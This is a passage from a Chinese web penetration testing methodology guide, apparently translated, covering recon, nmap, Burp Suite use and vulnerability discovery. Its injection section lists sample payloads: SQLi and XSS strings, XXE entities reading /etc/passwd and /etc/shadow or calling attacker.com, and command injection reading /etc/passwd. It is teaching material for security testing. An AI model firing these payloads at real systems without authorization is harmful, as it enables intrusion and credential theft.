@nsztm1.digi.ninja </span><br><span class="line">dig -t AXFR zonetransfer.me @nsztm2.digi.ninja</span><br></pre></td></tr></table></figure><ul><li>DNSRecon 可以自动化进行，而且往往会返回更多额外的信息。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnsrecon -d example.com</span><br></pre></td></tr></table></figure><h3 id="2-OSINT-公开情报收集"><a href="#2-OSINT-公开情报收集" class="headerlink" title="2. OSINT 公开情报收集"></a>2. OSINT 公开情报收集</h3><table><thead><tr><th>工具</th><th>描述</th></tr></thead><tbody><tr><td>Recon-NG</td><td>Tim ‘Lanmaster53’ Tomes写的公开情报工具框架，由社区维护。<a href="http://recon-ng.com/" target="_blank" rel="noopener">http://recon-ng.com/</a></td></tr><tr><td>Maltego</td><td>Maltego 是一款交互式的数据挖掘工具，它可以渲染出图用于关联分析。</td></tr><tr><td>theharvester</td><td>theHarvester 可以从不同的公开资源中收集邮箱、子域名、虚拟主机、开放的端口/主机指纹和员工姓名等信息</td></tr></tbody></table><p>我本想在这份笔记中包含详细的OSINT的介绍，但是想了想决定不这样做。因为我觉得这个部分可以单独写一篇（可能在之后的几篇中）。</p><p>在这篇笔记中我就介绍一些非常棒的关于OSINT的干货，我想渗透测试者们对于这些干货应该非常熟悉：</p><ul><li><p>Michael Bazzell</p><ul><li><a href="https://inteltechniques.com" target="_blank" rel="noopener">https://inteltechniques.com</a></li><li><a href="https://www.amazon.com/dp/1984201573/ref=as_li_ss_tl?ie=UTF8&amp;qid=1516984461&amp;sr=8-10&amp;keywords=open+source+intelligence+techniques&amp;linkCode=sl1&amp;tag=hookaround-20&amp;linkId=1fc9d5a9d120f07b7ba934120ef485a2" target="_blank" rel="noopener">Open Source Intelligence Techniques</a></li></ul></li><li><p>Google Dorking</p><ul><li><a href="https://www.exploit-db.com/google-hacking-database/" target="_blank" rel="noopener">https://www.exploit-db.com/google-hacking-database/</a></li></ul></li></ul><h2 id="0x02-Mapping"><a href="#0x02-Mapping" class="headerlink" title="0x02 Mapping"></a>0x02 Mapping</h2><blockquote><p>在一次渗透测试过程中，Mapping的目的是站在一个普通用户的角度去了解整个应用的全貌。</p></blockquote><h3 id="1-工具"><a href="#1-工具" class="headerlink" title="1. 工具"></a>1. 工具</h3><table><thead><tr><th>工具</th><th>介绍</th></tr></thead><tbody><tr><td>Nmap</td><td>带服务识别和操作系统指纹识别的TCP/IP主机和端口扫描工具</td></tr></tbody></table><h4 id="1-1-端口扫描，服务识别，OS识别"><a href="#1-1-端口扫描，服务识别，OS识别" class="headerlink" title="1.1 端口扫描，服务识别，OS识别"></a>1.1 端口扫描，服务识别，OS识别</h4><ul><li><p>扫描前1000号TCP端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.100.2</span><br></pre></td></tr></table></figure></li><li><p>Ping扫描8个本地主机(按ARP、ICMP、TCP 80的顺序)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –sP 192.168.100.0-7</span><br></pre></td></tr></table></figure></li><li><p>扫描80,443端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 80,443 192.168.100.2</span><br></pre></td></tr></table></figure></li><li><p>扫描前1000号TCP端口，OS指纹，服务，然后运行一个NSE脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -A 192.168.100.2</span><br></pre></td></tr></table></figure></li><li><p>扫描全部65535个TCP端口，OS指纹，服务，然后运行一个NSE脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap –A –p- 192.168.100.2</span><br></pre></td></tr></table></figure></li><li><p>扫描前1000号UDP端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sU 192.168.100.2</span><br></pre></td></tr></table></figure></li><li><p>扫描所有65535个UDP端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sU –p- 192.168.100.2</span><br></pre></td></tr></table></figure></li><li><p>扫描所有65535个UDP端口，并获取服务、OS指纹，之后运行一些NSE脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap –sU -p- -A 192.168.100.2</span><br></pre></td></tr></table></figure></li></ul><blockquote><p>! 端口扫描通常是渗透过程中第一步和第二步的过渡部分。要非常注意暴露的端口、服务版本和OS/s！</p></blockquote><h3 id="2-浏览器代理设置"><a href="#2-浏览器代理设置" class="headerlink" title="2. 浏览器代理设置"></a>2. 浏览器代理设置</h3><h4 id="2-1-Firefox"><a href="#2-1-Firefox" class="headerlink" title="2.1 Firefox"></a>2.1 Firefox</h4><table><thead><tr><th>工具</th><th>描述</th></tr></thead><tbody><tr><td>Firefox</td><td>跨平台的一款现代浏览器，有很多有用的插件</td></tr></tbody></table><p><code>Firefox</code>通常是Web渗透测试过程中的首选浏览器，这是因为它有很多有用的插件以及它的代理设置不会影响到全局代理。</p><h4 id="2-2-Firefox插件"><a href="#2-2-Firefox插件" class="headerlink" title="2.2 Firefox插件"></a>2.2 Firefox插件</h4><table><thead><tr><th>工具</th><th>描述</th></tr></thead><tbody><tr><td>User Agent Switcher</td><td>一款可以快速切换用户代理的Firefox插件</td></tr><tr><td>Wappalyzer</td><td>可以检测各种各样的网站所用的技术和软件组件的插件</td></tr><tr><td>FoxyProxy</td><td>代理切换插件</td></tr></tbody></table><p>这些插件在每次渗透测试过程中我总能用得到，我推荐你在第二步(Mapping)之前安装好它们。</p><h4 id="2-3-配置Firefox和Burpsuit"><a href="#2-3-配置Firefox和Burpsuit" class="headerlink" title="2.3 配置Firefox和Burpsuit"></a>2.3 配置Firefox和Burpsuit</h4><p>在你进行Mapping之前你一定要配置要浏览器的代理，让流量经过<code>Burp</code>。</p><ul><li><p>在<code>Firefox</code></p><ul><li><p>配置插件<code>FoxyProxy</code></p><ul><li>IP: 127.0.0.1</li><li>Port: 8080</li></ul></li><li><p>配置<code>Firefox</code>信任Burp的SSL证书</p><ul><li>打开<code>http://burp/</code></li><li>保存证书</li><li>将证书导入<code>Firefox</code></li></ul></li></ul></li></ul><h4 id="2-4-Burp配置"><a href="#2-4-Burp配置" class="headerlink" title="2.4 Burp配置"></a>2.4 Burp配置</h4><table><thead><tr><th>工具</th><th>描述</th></tr></thead><tbody><tr><td>Burp Suit Pro</td><td>Web安全测试套件</td></tr></tbody></table><p>你应该配置Burp让他适合自己的喜好。但是至少我推荐你设置<code>Scan Speed</code>为<code>thorough</code>，这样你在使用扫描器时就会发出更多地请求从而扫描出更多的漏洞。</p><h4 id="2-5-Burp扩展"><a href="#2-5-Burp扩展" class="headerlink" title="2.5 Burp扩展"></a>2.5 Burp扩展</h4><table><thead><tr><th>工具</th><th>描述</th></tr></thead><tbody><tr><td>Burp Extender</td><td>用于扩展Burp suite功能的API，可以在BApp商店获取</td></tr><tr><td>Retire.js (BApp)</td><td>用于检测版本落后的Javascript组件漏洞的Burp suite扩展</td></tr><tr><td>Wsdler (BApp)</td><td>可以解析WSDL文件，然后测试所有的允许的方法的请求</td></tr><tr><td>Python Scripter (BApp)</td><td>可以在每个HTTP请求和响应时执行一段用户定义的Python脚本</td></tr></tbody></table><p>这些<code>Burp</code>扩展是我在渗透测试过程中经常使用的。和<code>Firefox</code>扩展一样，我建议你们在Mapping之前安装好它们。</p><p>它们可以使用<code>Burp Suite Pro</code>的<code>Burp Extender</code>模块来安装。</p><h3 id="3-人工浏览"><a href="#3-人工浏览" class="headerlink" title="3. 人工浏览"></a>3. 人工浏览</h3><p>人工浏览可能是Mapping过程中最重要的部分。你有必要去浏览每个页面，点击页面上每一个跳转，这样在Burp的sitemap里面就可以出现这些请求和响应。</p><blockquote><p>！！！手工浏览对于单页应用非常非常重要。自动化的网页爬虫不能够爬到单页应用因为单页应用的HTTP请求都是用异步的AJAX来进行的。</p></blockquote><h3 id="4-自动化爬取"><a href="#4-自动化爬取" class="headerlink" title="4. 自动化爬取"></a>4. 自动化爬取</h3><p>自动化爬取是使用<code>Burp Spider</code>来进行的，这个过程可以发现你手工浏览没有发现的一些页面。通常来说Burp Spider会在传统的Web应用中发现更多的页面。</p><blockquote><p>！！！自动化爬虫非常危险。通常我会手工浏览80%~95%的页面，只用爬虫爬取很少的部分。因为在特定情况下爬虫很容易失效。</p></blockquote><h3 id="5-后续分析"><a href="#5-后续分析" class="headerlink" title="5. 后续分析"></a>5. 后续分析</h3><p>这个时候你应该使用<code>Burp</code>完成了Mapping这一步第一次的迭代，你应该注意目前掌握的所有信息。</p><h4 id="5-1-需要特别注意"><a href="#5-1-需要特别注意" class="headerlink" title="5.1 需要特别注意"></a>5.1 需要特别注意</h4><ul><li>Web 服务器</li><li>Web 软件体系结构(技术栈)</li><li>编程语言</li><li>框架</li><li>设计模式</li></ul><p>这个时候你可以注意一些需要特定页面跳转的功能点。通常这些功能点可以被手工操控，从而使其不用满足特定跳转顺序就可以实现，这可以让你有重大发现。(举个栗子，电子商务网站的付款功能，密码重置页面等)</p><h2 id="0x03-漏洞挖掘"><a href="#0x03-漏洞挖掘" class="headerlink" title="0x03 漏洞挖掘"></a>0x03 漏洞挖掘</h2><blockquote><p>在一次渗透测试过程中，漏洞挖掘是在攻击者的角度来了解整个Web应用的全貌。</p></blockquote><h3 id="1-过渡"><a href="#1-过渡" class="headerlink" title="1. 过渡"></a>1. 过渡</h3><p>在你Mapping之后，并且进行了一些基本的功能性的分析后，就可以开始进行漏洞挖掘了。这个步骤中，你应该尽可能多的识别出Web应用存在的漏洞。这些漏洞不仅是<code>The OWASP Top 10</code>中包含的那些，还包含于应用的商业逻辑中。记住一点，你将会遇到大量的漏洞，它不属于任何一个现有的分类中，你应该时刻警惕这一点。</p><h3 id="2-内容挖掘"><a href="#2-内容挖掘" class="headerlink" title="2. 内容挖掘"></a>2. 内容挖掘</h3><h4 id="2-1-漏洞扫描"><a href="#2-1-漏洞扫描" class="headerlink" title="2.1 漏洞扫描"></a>2.1 漏洞扫描</h4><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>Nikto</td><td>有指纹识别功能的Web服务漏洞扫描器</td></tr></tbody></table><p><code>Nikto</code>当之无愧的是最好的Web服务漏洞扫描器，特别是在大型的Web应用程序中表现非常好。它可以利用<code>-Format</code>选项来导出特定格式的扫描结果，使扫描结果更容易阅读和分析。</p><ul><li>扫描目标并将结果导出成HTML格式<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -h http://example.com -output ~/nikto.html -Format htm</span><br></pre></td></tr></table></figure></li></ul><blockquote><p>漏洞扫描通常是第二步和第三步的过渡。一旦有了扫描结果，一定要花时间去分析一下结果，打开一些引人注目的页面看看。</p></blockquote><h3 id="3-强制浏览-译者注：翻译的感觉很别扭，看下面内容应该能明白什么意思"><a href="#3-强制浏览-译者注：翻译的感觉很别扭，看下面内容应该能明白什么意思" class="headerlink" title="3. 强制浏览(译者注：翻译的感觉很别扭，看下面内容应该能明白什么意思)"></a>3. 强制浏览(译者注：翻译的感觉很别扭，看下面内容应该能明白什么意思)</h3><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>Burp Engagement Tools</td><td>Burp Suite Pro中自带的有特殊用途的工具集</td></tr><tr><td>Engagement Tool: Discover Content</td><td>Burp Suite Pro自带的用于强制浏览的工具</td></tr><tr><td>Burp Intruder</td><td>Burp Suite中可自定义的用于自动化的攻击的模块。(比如brute forcing, injection, 等)</td></tr><tr><td>FuzzDB</td><td>包含各种恶意输入、资源名、用于grep搜索响应内容的字符串、Webshell等。</td></tr></tbody></table><p>强制浏览是一种挖掘技巧，它可以发现应用程序中没有被引用但是确实是可以访问的页面。<code>Discover Content</code>是<code>Burp</code>中专门用于此目的的工具。除此之外，<code>Burp Intruder</code>也可以通过字典攻击来实施强制浏览(通常是在url参数和文件路径部分进行修改)。<code>FuzzDB</code>包含一些用于此目的的非常牛逼的字典，你可以在<a href="https://github.com/fuzzdb-project/fuzzdb/tree/master/discovery" target="_blank" rel="noopener">这里</a>看看。</p><h4 id="3-1-测试可选内容"><a href="#3-1-测试可选内容" class="headerlink" title="3.1 测试可选内容"></a>3.1 测试可选内容</h4><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>User Agent Switcher</td><td>用于迅速切换浏览器的User Agent的一款Firefox插件</td></tr><tr><td>Burp Intruder</td><td>Burp Suite中可自定义的用于自动化的攻击的模块。(比如brute forcing, injection, 等)</td></tr><tr><td>FuzzDB</td><td>包含各种恶意输入、资源名、用于grep搜索响应内容的字符串、Webshell等。</td></tr></tbody></table><p>在内容挖掘这一步，我非常喜欢做一件事。那就是利用<code>User Agent Switcher</code>切换不同的User Agent然后访问同一个特定页面。这是因为很多的Web应用对于不同的<code>User-Agent</code>和<code>Referer</code>请求头会返回不同的内容。</p><p>我经常使用<code>Burp Intruder</code>来模糊测试<code>User-Agent</code>和<code>Referer</code>请求头，一般还利用<code>FuzzDB</code>的字典。</p><h3 id="4-自动化的漏洞挖掘"><a href="#4-自动化的漏洞挖掘" class="headerlink" title="4. 自动化的漏洞挖掘"></a>4. 自动化的漏洞挖掘</h3><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>Burp Scanner</td><td>自动化扫描安全漏洞的Burp Suite工具</td></tr></tbody></table><p>当你在Mapping和进行漏洞挖掘的开始部分时候，<code>Burp Passive Scanner</code>就已经在后台悄悄运行。你应该先分析这份扫描结果，然后再进行<code>Burp Active Scanner</code>，这样在<code>Burp Passive Scanner</code>中发现的值得关注的页面就可以在<code>Burp Active Scanner</code>中进行详细的扫描。</p><p>由于Burp Active Scanner完成所需的时间非常长，我更喜欢只允许一小段时间，然后查看两者之间的扫描结果并记录结果。</p><blockquote><p>！！！自动化的漏洞扫描是很危险的。用Burp Scanner可能导致不良的影响。除非你非常熟悉目标的功能与环境，否则你只应在非生产环境中使用。</p></blockquote><h3 id="5-配置"><a href="#5-配置" class="headerlink" title="5. 配置"></a>5. 配置</h3><h4 id="5-1-默认配置"><a href="#5-1-默认配置" class="headerlink" title="5.1 默认配置"></a>5.1 默认配置</h4><p>在确认了目标所使用的技术后，很自然的一步跟进就是测试有没有默认配置。许多框架使用许多易受攻击默认配置的应用程序以便于向开发人员介绍他们的产品。然后由于开发人员的疏忽，这些示例应用被部署到和目标站点所在的同一台服务器上，这使得目标站点承受很大的风险。</p><h4 id="5-2-错误配置"><a href="#5-2-错误配置" class="headerlink" title="5.2 错误配置"></a>5.2 错误配置</h4><p>在Web渗透测试的每一步，你都应该注意Web应用有没有错误的配置。你可以特别关注页面出现的错误信息，这些信息经常会给出很有用的<code>数据库结构</code>和<code>服务器文件系统</code>等信息。</p><blockquote><p>错误信息几乎总能够发现一些。这些错误信息在注入和LFI(Local File Include)中特别有用。</p></blockquote><p>另外一个值得注意的是页面的敏感表单有没有禁用自动填充。比如密码字段经常会有一个“显示/隐藏”按钮。浏览器默认不会填充<code>type=&quot;password&quot;</code>的<code>input</code>标签内容，而当密码字段是“显示”时，<code>input</code>标签就变成了<code>type=&quot;text&quot;</code>，这样浏览器就会进行自动填充。这在多用户环境下是一个隐患。</p><h3 id="6-身份认证"><a href="#6-身份认证" class="headerlink" title="6. 身份认证"></a>6. 身份认证</h3><p>在漏洞挖掘过程中，你应该认真审视你看到的每个登录表单。如果这些表单没有做很好的安全措施(比如双重认证，验证码，禁止重复提交等)，攻击者就可能得到用户账户未授权的权限。取决于表单的不同实现以及不同的框架/CMS，即使登录失败目标站点也可能会透露出用户账户的一些信息。</p><p>如果你测试发现了上述所讨论的问题，你应该关注并记录。另外，如果登录表单没有加密(或者利用了旧版本的SSL/TLS)，这也应该关注并记录。</p><h4 id="6-1-模糊登录测试"><a href="#6-1-模糊登录测试" class="headerlink" title="6.1 模糊登录测试"></a>6.1 模糊登录测试</h4><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>CeWL</td><td>通过爬取目标站点来生成用户字典的工具</td></tr><tr><td>Burp Intruder</td><td>Burp Suite中可自定义的用于自动化的攻击的模块。(比如brute forcing, injection, 等)</td></tr></tbody></table><p>在你认真审视了登录表单后，就可以开始登录测试了。<code>CeWL</code>是一款非常好用的用于生成一次性字典的工具。你可以利用<code>-h</code>查看帮助文档。</p><p>基本语法如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl [options] www.example.com</span><br></pre></td></tr></table></figure></p><p>当你构造好用户字典后就可以开始用<code>Burp Intruder</code>进行实际的模糊测试了。通常我会用两个payload集(一个是用户名的，另一个是<code>CeWL</code>生成的密码)。Intruder的Attack Type通常应该选<code>Cluster Bomb</code>。</p><h3 id="7-Session管理"><a href="#7-Session管理" class="headerlink" title="7. Session管理"></a>7. Session管理</h3><p>Session-token/Cookie分析在渗透测试过程中虽然不是很吸引人的部分，但确实非常重要的一块。通常是这样子的，你想了解整个web应用是如何跟踪Session，然后用<code>Burp Sequencer</code>这样的工具去测试session token的随机性/可预测性。一些应用(较传统的应用)会把session的内容存储在客户端。有时候这些数据里面会包含有加密的，序列化的敏感信息。</p><p>这时也应该检查HTTP返回头的<code>Set-Cookie</code>是否包含<code>Secure</code>和<code>HttpOnly</code>的标识。如果没有的话就值得注意了，因为没有理由不设置这些标识位。</p><blockquote><p>Google搜索你得到的session token，可能会有一些发现，比如Session可预测等，这样就可以进行Session劫持攻击。</p></blockquote><h4 id="7-1-用Burp测试Session-Tokens"><a href="#7-1-用Burp测试Session-Tokens" class="headerlink" title="7.1 用Burp测试Session Tokens"></a>7.1 用Burp测试Session Tokens</h4><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>Burp Sequencer</td><td>Burp用来分析数据集的随机性的模块</td></tr></tbody></table><p><code>Burp Sequencer</code>是用来测试Session Token随机性和可预测性的很好的工具。当你用这个工具来测试目标的Session管理时，你应该先清除所有的Cookies，然后重新认证一次。然后就可以把带有<code>Set-Cookie</code>头的返回包发送给<code>Burp Sequencer</code>，然后Sequencer就会启动新的拦截对Token进行分析。通常10000次请求就差不多可以判断随机性和可预测性了。</p><p>如果发现Session token不够随机，那就可以考虑Session劫持了。</p><h3 id="8-授权"><a href="#8-授权" class="headerlink" title="8. 授权"></a>8. 授权</h3><p>授权漏洞很像<a href="https://www.owasp.org/index.php/Top_10_2013-A7-Missing_Function_Level_Access_Control" target="_blank" rel="noopener">功能级访问控制缺失</a>和<a href="https://www.owasp.org/index.php/Top_10_2013-A4-Insecure_Direct_Object_References" target="_blank" rel="noopener">不安全的直接对象引用</a>漏洞，是很长一段时间我发现的最流行的漏洞。这是因为许多的开发者没有想到一个低权限甚至是匿名用户会去向高权限的接口发送请求(失效的权限控制)。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/app/admin_getappInfo</span><br></pre></td></tr></table></figure></p><p>或者是去请求其他用户的数据(不安全的直接对象引用，译者注：水平越权)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/app/accountInfo?acct=notmyacct</span><br></pre></td></tr></table></figure></p><h4 id="8-1-测试权限控制"><a href="#8-1-测试权限控制" class="headerlink" title="8.1 测试权限控制"></a>8.1 测试权限控制</h4><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>Compare Site Maps</td><td>Burp的用于测试授权的模块</td></tr></tbody></table><p>这里有个小技巧，就是注册两个不同权限的用户，然后用高权限的用户去访问整个Web应用，退出高权限用户，登录低权限用户,然后用Burp的<code>Compare Site Maps</code>工具去测试哪些页面的权限控制没有做好。</p><h3 id="9-数据验证测试"><a href="#9-数据验证测试" class="headerlink" title="9. 数据验证测试"></a>9. 数据验证测试</h3><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>Burp Repeater</td><td>用于手工修改、重放HTTP请求的Burp模块</td></tr></tbody></table><p>注入漏洞的存在是因为Web应用接受任意的用户输入，并且在服务端没有正确验证用户的输入的有效性。作为一个渗透测试者，你应该注意每一个接受随意的用户输入的地方并设法进行注入。</p><p>因为每个Web应用情况都不一样，所以没有一种万能的注入方式。接下来，我会把注入漏洞进行分类并且给出一些Payload。<code>Burp Repeater</code>是我测试注入漏洞时最常使用的工具。它可以重放HTTP请求，并且可以随时修改Payload。</p><p>有一件事需要谨记：漏洞挖掘阶段要做的只是识别漏洞，而漏洞利用阶段才会利用漏洞做更多地事。当然，每个注入漏洞都值得被记录，你可以在漏洞挖掘阶段之后对这些注入漏洞进行深入的测试。</p><p>在每个分类下可以参照<a href="https://www.owasp.org/" target="_blank" rel="noopener">OWASP</a>获取更多地信息。</p><h4 id="9-1-SQLi"><a href="#9-1-SQLi" class="headerlink" title="9.1 SQLi"></a>9.1 SQLi</h4><p>任何将输入带入数据库进行查询的地方都可能存在SQL注入。结合错误的配置问题，会导致大量的数据被攻击者盗取。</p><p>我推荐你在做SQL注入时参照这个<a href="https://sqlwiki.netspi.com/#mysql" target="_blank" rel="noopener">Wiki</a>。如果你输入了这些Payload得到了数据库返回的错误信息，那么目标就非常有可能存在SQL注入漏洞。</p><p><code>Sqlmap</code>是一款自动化的SQL注入工具，我将会在漏洞利用阶段介绍它。</p><p><a href="https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005" target="_blank" rel="noopener">OWASP-测试SQL注入</a>)</p><ul><li>示例</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&apos; OR 1=1 -- 1</span><br><span class="line">&apos; OR &apos;1&apos;=&apos;1</span><br><span class="line">&apos; or 1=1 LIMIT 1;-- </span><br><span class="line">admin&apos;;--</span><br><span class="line"></span><br><span class="line">http://www.example.com/product.php?id=10 AND 1=1</span><br></pre></td></tr></table></figure><h4 id="9-2-跨站脚本攻击-XSS"><a href="#9-2-跨站脚本攻击-XSS" class="headerlink" title="9.2 跨站脚本攻击(XSS)"></a>9.2 跨站脚本攻击(XSS)</h4><p>攻击者利用Web应用程序发送恶意代码(通常是JavaScript代码)给另外一个用户，就发生了XSS。</p><p>有三种不同的XSS：</p><ol><li>存储型。当提供给Web应用的数据是攻击者事先提交到服务器端永久保存的恶意代码时，发生存储型XSS。</li><li>反射型。当提供给Web应用的数据是服务端脚本利用攻击者的恶意输入生成的页面时，发生反射型XSS。</li><li>DOM型。DOM型XSS存在于客户端的脚本。</li></ol><p><a href="https://www.owasp.org/index.php/Testing_for_Cross_site_scripting" target="_blank" rel="noopener">OWASP-测试XSS</a></p><ul><li>示例</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;</span><br><span class="line">&quot;&gt;&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;&lt;&quot;</span><br><span class="line">&quot; onmouseover=&quot;alert(&apos;XSS&apos;)</span><br><span class="line"></span><br><span class="line">http://server/cgi-bin/testcgi.exe?&lt;SCRIPT&gt;alert(“Cookie”+document.cookie)&lt;/SCRIPT&gt;</span><br><span class="line">%3cscript src=http://www.example.com/malicious-code.js%3e%3c/script%3e</span><br></pre></td></tr></table></figure><h4 id="9-3-XML-注入"><a href="#9-3-XML-注入" class="headerlink" title="9.3 XML 注入"></a>9.3 XML 注入</h4><p>当Web应用的XML解析器没有正确的验证攻击者传入的XML文档，就会发生XML注入。</p><p><a href="https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008" target="_blank" rel="noopener">OWASP-测试XML注入</a>)</p><ul><li>示例</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username = foo&lt;</span><br><span class="line">Username = foo&lt;!--</span><br></pre></td></tr></table></figure><h4 id="9-4-XML实体注入-XXE"><a href="#9-4-XML实体注入-XXE" class="headerlink" title="9.4 XML实体注入(XXE)"></a>9.4 XML实体注入(XXE)</h4><p>若实体的定义是一个URI，那么这个实体就叫做外部实体。除非特别配置，不然外部实体会导致XML解析器去请求这个URI。比如请求本地或远程的一个文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [  </span><br><span class="line">  &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [  </span><br><span class="line">  &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/shadow&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [  </span><br><span class="line">  &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">  &lt;!ENTITY xxe SYSTEM &quot;file:///c:/boot.ini&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [  </span><br><span class="line">  &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">  &lt;!ENTITY xxe SYSTEM &quot;http://www.attacker.com/text.txt&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure></p><h4 id="9-5-模板注入"><a href="#9-5-模板注入" class="headerlink" title="9.5 模板注入"></a>9.5 模板注入</h4><p>模板注入就是攻击者利用模板的语法注入恶意代码。</p><p><a href="https://portswigger.net/blog/server-side-template-injection" target="_blank" rel="noopener">Portswigger-服务端模板注入</a></p><ul><li>示例</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= 7 * 7 %&gt;</span><br><span class="line">&#123;&#123; 7 * 7 &#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="9-6-命令注入"><a href="#9-6-命令注入" class="headerlink" title="9.6 命令注入"></a>9.6 命令注入</h4><p>用户注入操作系统的命令到Web应用程序并被执行，就发生了命令注入。</p><p><a href="https://www.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013" target="_blank" rel="noopener">OWASP-测试命令注入</a>)</p><ul><li>示例</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|</span><br><span class="line">http://sensitive/something.php?dir=%3Bcat%20/etc/passwd</span><br><span class="line"></span><br><span class="line">Doc=Doc1.pdf+|+Dir c:\</span><br></pre></td></tr></table></figure><h4 id="9-7-恶意重定向"><a href="#9-7-恶意重定向" class="headerlink" title="9.7 恶意重定向"></a>9.7 恶意重定向</h4><p>当应用没有检查用户可控输入时，攻击者输入了恶意的URL并被应用接受时发生。</p><p><a href="https://www.owasp.org/index.php/Testing_for_Client_Side_URL_Redirect_(OTG-CLIENT-004" target="_blank" rel="noopener">OWASP-测试客户端恶意重定向</a>)</p><ul><li>示例</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.target.site?#redirect=www.fake-target.site </span><br><span class="line">http://www.target.site??url=http://www.fake-target.site</span><br></pre></td></tr></table></figure><h4 id="9-8-本地文件包含-LFI"><a href="#9-8-本地文件包含-LFI" class="headerlink" title="9.8 本地文件包含(LFI)"></a>9.8 本地文件包含(LFI)</h4><p>LFI指的是Web应用允许包含本地服务器端存在的文件。</p><p><a href="https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion" target="_blank" rel="noopener">OWASP-测试本地文件包含</a></p><ul><li>示例</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 